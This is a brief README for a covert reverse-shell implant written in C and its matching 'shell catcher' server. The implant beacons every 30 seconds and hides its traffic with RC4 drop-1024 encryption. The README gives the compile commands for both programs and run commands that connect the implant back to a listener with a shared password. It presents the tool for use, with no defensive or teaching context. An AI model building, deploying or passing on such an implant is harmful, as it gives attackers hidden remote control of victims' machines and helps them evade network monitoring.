# RC4 encrypted reverse shell

The reverse shell attempts to make a connection every 30 seconds.
Traffic is RC4 drop 1024 encrypted with the sha256 hash of the key. 

## Useage
Note you may need to add `-lpthread` to compile!
### Reverse Shell
```
gcc -o implant reverse-shell.c sha256.c
./implant 127.0.0.1 58008 MY-SUPER-SECRET-PASSWORD
```

### Shell Catcher
```
gcc -o server ./server.c sha256.c
./server 58008 MY-SUPER-SECRET-PASSWORD 
```
